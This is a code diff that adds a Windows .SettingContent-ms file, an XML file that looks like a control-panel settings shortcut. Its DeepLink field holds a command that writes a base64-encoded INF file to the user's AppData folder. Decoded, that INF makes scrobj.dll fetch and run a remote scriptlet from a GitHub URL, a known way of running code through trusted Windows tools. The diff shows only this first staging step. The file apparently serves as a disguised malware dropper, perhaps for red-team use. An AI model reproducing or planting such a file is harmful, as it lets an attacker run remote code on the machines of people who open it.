@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<PCSettings>
+  <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
+    <ApplicationInformation>
+      <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
+      <DeepLink>echo W3ZlcnNpb25dClNpZ25hdHVyZT0kY2hpY2FnbyQKQWR2YW5jZWRJTkY9Mi41CgpbRGVmYXVsdEluc3RhbGxfU2luZ2xlVXNlcl0KVW5SZWdpc3Rlck9DWHM9VW5SZWdpc3Rlck9DWFNlY3Rpb24KCltVblJlZ2lzdGVyT0NYU2VjdGlvbl0KJTExJVxzY3JvYmouZGxsLE5JLGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NYXJpYVZ1bGthbi9DTVNUUC9tYXN0ZXIvZHZwbi5zY3QKCltTdHJpbmdzXQpBcHBBY3QgPSAiU09GVFdBUkVcTWljcm9zb2Z0XENvbm5lY3Rpb24gTWFuYWdlciIKU2VydmljZU5hbWU9IkRWUE4iClNob3J0U3ZjTmFtZT0iRFZQTiIK > %APPDATA%\tmp.b64</DeepLink>
+      <Icon>%windir%\system32\control.exe</Icon>
+    </ApplicationInformation>
+    <SettingIdentity>
+      <PageID></PageID>
+      <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
+    </SettingIdentity>
+    <SettingInformation>
+      <Description>@shell32.dll,-4161</Description>
+      <Keywords>@shell32.dll,-4161</Keywords>
+    </SettingInformation>
+  </SearchableContent>
+</PCSettings>
